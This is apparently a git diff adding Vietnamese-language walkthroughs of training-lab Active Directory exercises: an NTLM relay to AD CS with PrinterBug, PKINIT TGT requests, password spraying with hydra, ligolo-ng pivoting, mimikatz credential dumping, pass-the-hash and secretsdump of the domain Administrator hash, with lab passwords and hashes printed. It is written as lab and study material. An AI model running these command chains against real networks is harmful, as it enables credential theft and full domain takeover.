@@ -1905,6 +1905,110 @@ Valid starting       Expires              Service principal
 
 ![](images/52.png)
 
+# Pass the Certificate
+
+#### Questions
+
+ Authenticate to 10.129.225.86 (ACADEMY-PWATTCK-PTCDC01) ,10.129.234.172 (ACADEMY-PWATTCK-PTCCA01) with user "wwhite" and password "package5shores_topher1"
+
++ 0  What are the contents of flag.txt on jpinkman's desktop?
+
+Check hostname:
+
+```zsh
+nxc smb 10.129.175.231 -u wwhite -p 'package5shores_topher1'
+nxc smb 10.129.79.154 -u wwhite -p 'package5shores_topher1'
+```
+
+![](images/88.png)
+
+10.129.175.231 - DC01
+10.129.79.154 - CA01
+
+Add to `/etc/hosts`
+
+![](images/89.png)
+
+Kiểm tra webpage của ca01, có yêu cầu đăng nhập. chúng ta có thể đăng nhập với thông tin mà đề bài cho sẵn.
+
+![](images/90.png)
+
+Chúng ta có thể thử request certificate. nhưng không, nó đã bị disabled.
+
+![](images/91.png)
+
+Có thể tải xuống trực tiếp certificate
+
+![](images/92.png)
+
+Hoặc tạo ticket mới/renew với ticket có sẵn/cũ
+![](images/93.png)
+
+Try to catch template, didn't work
+
+```zsh
+certipy-ad find -u 'wwhite' -p 'package5shores_topher1' -dc-ip 10.129.175.231 -stdout -vulnerable
+```
+
+![](images/95.png)
+
+Vậy chúng ta sẽ thử với template mặc định là `KerberosAuthentication`
+
+```zsh
+impacket-ntlmrelayx -t http://ca01.inlanefreight.local/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
+```
+
+Try Printer Bug, nó sẽ báo thất bại ở đầu
+
+```zsh
+python3 /opt/printerbug.py inlanefreight.local/wwhite:package5shores_topher1@10.129.175.231 10.10.14.80
+```
+
+![](images/94.png)
+
+Tuy nhiên bên máy chủ relay của chúng ta nhận được certificate:
+
+![](images/96.png)
+
+![](images/97.png)
+
+Tiếp theo chúng ta sẽ dùng chứng chỉ này để yêu cầu vé TGT
+
+```zsh
+python3 /opt/gettgtpkinit.py -cert-pfx DC01$.pfx -dc-ip 10.129.175.231 'inlanefreight.local/DC01$' /tmp/tgt.ccache
+```
+![](images/98.png)
+Sau đó chúng ta thực hiện Pass the Ticket để có quyền truy cập vào DC01, trước hết là import ticket
+
+```zsh
+export KRBCC5NAME=/tmp/tgt.ccache
+```
+
+Dump hash của Administrator
+
+```zsh
+impacket-secretsdump -k -no-pass -dc-ip 10.129.175.231 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$@DC01.INLANEFREIGHT.LOCAL'
+```
+
+![](images/99.png)
+
+```
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:fd02e525dd676fd8ca04e200d265f20c
+```
+
+Truy cập vào DC01 với PTH qua rpd (nhớ enable restrict admin) hoặc qua winrm
+
+Enable Restrict Admin
+```zsh
+nxc smb 10.129.175.231 -u Administrator -H fd02e525dd676fd8ca04e200d265f20c -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
+```
+
+```zsh
+xfreerdp3 /v:10.129.175.231 /u:Administrator /pth:fd02e525dd676fd8ca04e200d265f20c
+```
+
++ 0  What are the contents of flag.txt on Administrator's desktop?
+
 # Protected Files
 
 - Use the cracked password of the user Kira and log in to the host and crack the "id_rsa" SSH key. Then, submit the password for the SSH key as the answer.
@@ -2580,3 +2684,322 @@ Xong việc, chúng ta cần trả lại một vài thứ:
 ```
 
 Happy hecking!
+
+# Skills Assessment (New update 06/2025)
+## The Credential Theft Shuffle
+
+[The Credential Theft Shuffle](https://adsecurity.org/?p=2362), as coined by `Sean Metcalf`, is a systematic approach attackers use to compromise Active Directory environments by exploiting `stolen credentials`. The process begins with gaining initial access, often through phishing, followed by obtaining local administrator privileges on a machine. Attackers then extract credentials from memory using tools like Mimikatz and leverage these credentials to `move laterally across the network`. Techniques such as pass-the-hash (PtH) and tools like NetExec facilitate this lateral movement and further credential harvesting. The ultimate goal is to escalate privileges and `gain control over the domain`, often by compromising Domain Admin accounts or performing DCSync attacks. Sean emphasizes the importance of implementing security measures such as the `Local Administrator Password Solution (LAPS)`, enforcing `multi-factor authentication`, and `restricting administrative privileges` to mitigate such attacks.
+
+## Skills Assessment
+
+`Betty Jayde` works at `Nexura LLC`. We know she uses the password `Texas123!@#` on multiple websites, and we believe she may reuse it at work. Infiltrate Nexura's network and gain command execution on the domain controller. The following hosts are in-scope for this assessment:
+
+| Host     | IP Address                                                  |
+| -------- | ----------------------------------------------------------- |
+| `DMZ01`  | `10.129.*.*` **(External)**, `172.16.119.13` **(Internal)** |
+| `JUMP01` | `172.16.119.7`                                              |
+| `FILE01` | `172.16.119.10`                                             |
+| `DC01`   | `172.16.119.11`                                             |
+
+#### Pivoting Primer
+
+The internal hosts (`JUMP01`, `FILE01`, `DC01`) reside on a private subnet that is not directly accessible from our attack host. The only externally reachable system is `DMZ01`, which has a second interface connected to the internal network. This segmentation reflects a classic DMZ setup, where public-facing services are isolated from internal infrastructure.
+
+To access these internal systems, we must first gain a foothold on `DMZ01`. From there, we can `pivot` — that is, route our traffic through the compromised host into the private network. This enables our tools to communicate with internal hosts as if they were directly accessible. After compromising the DMZ, refer to the module `cheatsheet` for the necessary commands to set up the pivot and continue your assessment.
+#### Questions
+
+Answer the question(s) below to complete this Section and earn cubes!
+
+Target(s):  Target(s) are spawning...  
+
++ 3  What is the NTLM hash of NEXURA\Administrator?
+
+Từ đề bài này, có lẽ chúng ta phải tiến hành `spray password` để tìm tài khoản của Betty Jayde
+
+Tạo betty_usernames.txt
+
+```zsh
+/opt/username-anarchy/username-anarchy Betty Jayde > betty_usernames.txt
+```
+
+Tiến hành spray password
+nxc không có kết quả gì, có lẽ smb ko chạy trên cổng 445 hoặc cổng đóng
+
+```zsh
+nxc smb 10.129.234.116 -d inlanefreight.local -u ~/Downloads/betty_usernames.txt -p 'Texas123!@#'
+```
+
+![](images/100.png)
+
+Không có thật :))
+
+![](images/102.png)
+
+Vậy chúng ta sẽ dùng hydra để spray qua `ssh`
+
+```zsh
+hydra -L betty_usernames.txt -p 'Texas123!@#' -f ssh://10.129.234.116  -I -t 4
+```
+
+```
+[22][ssh] host: 10.129.234.116   login: jbetty   password: Texas123!@#
+```
+
+```zsh
+ssh jbetty@10.129.234.116
+```
+
+Hay thực chạy bloodhound-ce-python trước để cho cái nhìn tổng quát hơn, chúng ta cần tải sang từ DMZ01 hoặc set up ligolo để pivot. Ở đây tôi sẽ dùng ligolo-ng
+
+Tải sang agent cho máy DMZ01
+
+```zsh
+# ON kali
+sudo python3 -m http.server 80
+# On DMZ
+wget http://10.10.14.80/agent
+```
+
+Trên VM
+
+```zsh
+sudo ip tuntap add user kali mode tun ligolo && sudo ip link set ligolo up
+```
+
+Nếu như nó down như này đừng lo, sau khi bắt được tín hiệu nó sẽ tự up.
+
+![](images/103.png)
+
+Chạy proxy trên VM:
+
+```zsh
+./proxy -selfcert -laddr 0.0.0.0:443
+```
+
+Trên DMZ01 chạy agent:
+
+```zsh
+chmod +x agent
+./agent -connect 10.10.14.80:443 -ignore-cert
+```
+
+Chọn session và start tunnel
+
+![](images/104.png)
+
+Tiếp theo thêm auto route:
+
+```zsh
+sudo ip route add 172.16.119.0/24 dev ligolo
+```
+
+Vậy là xong pivot.
+
+Chúng ta thấy rằng jbetty không phải là người dùng miền `nexura.htb`
+
+![](images/105.png)
+
+![](images/106.png)
+
+Liệt kê tại DMZ01 ta thấy có vẻ như không có lợi gì
+
+![](images/107.png)
+
+Chúng ta thấy một đoạn thông tin trong .bash_history
+
+![](images/108.png)
+
+Thông tin của người dùng này hoàn toàn có thể xác thực trên miền, chúng ta cũng có thể ssh sang FILE01, nhưng khoan đã, trước hết ta nên chạy bloodhound.
+
+```zsh
+bloodhound-ce-python -u hwilliam -p 'dealer-screwed-gym1' -ns 172.16.119.11 -d nexura.htb -c All --zip
+```
+
+Nếu ta check bằng nmap thì sẽ có một số thông tin như sau:
+
+```zsh
+JUMP01
+Discovered open port 3389/tcp on 172.16.119.7
+Discovered open port 5985/tcp on 172.16.119.7
+
+FILE01
+Discovered open port 3389/tcp on 172.16.119.10
+Discovered open port 445/tcp on 172.16.119.10
+Discovered open port 135/tcp on 172.16.119.10
+Discovered open port 5985/tcp on 172.16.119.10
+```
+
+Xác nhận `hwilliam` có thể rdp vào FILE01 và cả JUMP01
+
+```zsh
+nxc rdp 172.16.119.10 -u hwilliam -p 'dealer-screwed-gym1'
+nxc rdp 172.16.119.7 -u hwilliam -p 'dealer-screwed-gym1'
+```
+
+Tôi sẽ rdp vào JUMP01 trước
+
+```zsh
+xfreerdp3 /v:172.16.119.7 /u:hwilliam /p:dealer-screwed-gym1
+```
+
+Tôi tìm qua nhưng không thấy có gì, lẽ ra chúng ta phải vào FILE01 trước!
+
+![](images/109.png)
+
+RDP vào file01
+
+```zsh
+xfreerdp3 /v:172.16.119.10 /u:hwilliam /p:dealer-screwed-gym1
+```
+
+Tôi không rõ lý do không thể kết nối được, tôi sẽ dùng rdp
+
+![](images/110.png)
+
+```zsh
+evil-winrm -i 172.16.119.10 -u hwilliam -p dealer-screwed-gym1
+```
+
+![](images/111.png)
+
+Vậy thì chiến thuật cũ, enum qua mạng share.
+
+```zsh
+nxc smb 172.16.119.10 -d nexura.htb -u hwilliam -p 'dealer-screwed-gym1' --shares
+```
+
+![](images/112.png)
+
+Do không thể có rdp tại FILE01 nên tôi quyết định rdp lại JUMP01 để enum cho dễ.
+
+![](images/113.png)
+
+Kết hợp GUI với zsh...
+
+Có một file `Online Passwords` trong `\\file01\PRIVATE\hwilliam` nhưng chỉ có như này. Có lẽ là ID để đăng nhập vào phần mềm ở Desktop, thứ chúng ta cần là mật khẩu!
+
+![](images/114.png)
+
+
+Không đem lại kết quả nào
+```zsh
+nxc smb 172.16.119.10 -d nexura.htb -u hwilliam -p 'dealer-screwed-gym1' --spider HR --content --pattern '*passw*'
+```
+
+Nhưng tôi tìm thấy vài file thú vị khi ở `\\HR\Archive`, nó là các file mật khẩu của `Password Safe3`, tôi sẽ dùng thử `john the ripper` để crack cái file này.
+
+![](images/115.png)
+
+Chỉ có một file duy nhất cho ta thông tin, nhưng tôi chưa biết nó là gì...
+
+```
+hwilliam@JUMP01:00001512
+```
+
+Đầu tiên trích xuất hash ra file riêng
+
+```zsh
+pwsafe2john Employee-Passwords_OLD.psafe3 > psafe_hash
+```
+
+Tiến hành crack
+
+![](images/116.png)
+
+`michaeljackson`
+
+Chọn file để xem mật khẩu
+
+![](images/117.png)
+
+Nhập vào mật khẩu
+
+![](images/118.png)
+
+Rất nhiều thứ chúng ta cần ở đây
+
+![](images/119.png)
+
+```
+bdavid:caramel-cigars-reply1
+stom:fails-nibble-disturb4
+hwilliam:warned-wobble-occur8
+```
+
+Qua xác thực đơn giản, ta chỉ có thể truy cập vào được người dùng `bdavid` có lẽ mật khẩu hiện tại ta đang có của william là do anh ta đã đổi cùng với stom cũng đã đổi
+
+![](images/120.png)
+
+Người dùng này không có gì quá nổi bật, tôi đã thử rdp sang FILE01 hay DC01 với `bdavid` nhưng không được, tôi lại phải rdp ngược lại JUMP01, có lẽ sẽ là đống tài nguyên được chia sẻ còn lại kia.
+Có một vài file .pcap ở đây, chắc chắn ta phải phân tích nó
+
+![](images/121.png)
+
+Chỉ có file cuối cùng là cần phải xem xét, tuy nhiên với khối lượng khổng lồ, chúng ta phải có chiến thuật. Trước hết, tôi sẽ phân tích cách dịch vụ trước, đầu tiên là `ftp`
+Với kích thước file lên đến 84 Mb, 257 interfaces và hơn 320000 gói tin, việc xử lý file này không phải đơn giản.
+
+Lọc riêng dịch vụ ftp thành file nhỏ hơn:
+
+```zsh
+tshark -r 2025-04-29_live.pcap -Y "ftp" -w ftp.pcap
+```
+
+Kích thước của file giảm xuống đáng kể
+
+```zsh
+-rw-r--r-- 1 kali kali 86779688 Apr 29 11:56 2025-04-29_live.pcap
+-rw-rw-r-- 1 kali kali    37000 Jun 24 13:21 ftp.pcap
+```
+
+Tiếp theo chúng ta sẽ phân tích nó trong WireShark
+
+![](images/122.png)
+
+Có rất nhiều thông tin thú vị, tôi sẽ tổng hợp lại sau.
+
+```
+ftp1119456-nureintest:98fDMjEHP6kV0D62WhK1
+
+snmp community n5rAD1ig314IqfioYBWw
+
+imap AGpvaGFubmVzAGpvaGFubmVzMDE=
+```
+
+Có vẻ như đây toàn là những thông tin rác, sau khi quay trở lại vào ngày hôm sau, tôi tính đến phương án khác là dump hash trong máy. Tôi nhận ra người dùng `bdavid` có quyền local admin???????? Điều này hết sức ngớ ngẩn vì tôi đã quá tin vào cái `bloodhound-ce-python`
+
+Sau khi bình tĩnh lại tôi đã check lại bằng `SharpHounbe.exe`
+
+![](images/123.png)
+
+#### **Kinh nghiệm rút ra là bạn nên chạy SharpHound trực tiếp trên máy trong miền nếu có cơ hội! Mọi nỗ lực từ xa không thể bằng một phiên rdp hoặc winrm!**
+
+Giờ thì đơn giản hơn rất nhiều, tôi thực sự đã dành ra cả ngày hôm qua đọc cái tệp .pcap chết tiệt đó... Chúng ta sẽ dump hash bằng mimikatz hoặc rubeus. Đầu tiên chạy cmd với quyền Admin
+
+```cmd
+mimikatz.exe
+privilege::debug
+sekurlsa::logonpasswords
+```
+
+Chúng ta có đã có được NTLM của người dùng `stom`
+
+![](images/124.png)
+
+Tôi đã thử crack hash của stom nhưng không được, vậy chúng ta sẽ phải `Pass the Hash`
+
+![](images/125.png)
+
+Và thế là hết, `stom` là local  admin của `DC01` vậy thì bước cuối cùng có lẽ chỉ cần dump hash
+
+![](images/126.png)
+
+```zsh
+impacket-secretsdump 'nexura.htb/stom'@172.16.119.11 -hashes ':21ea958524cfd9a7791737f8d2f764fa' -just-dc-ntlm -just-dc-user Administrator
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:36e09e1e6ade94d63fbcab5e5b8d6d23:::
+[*] Cleaning up... 
+```
+
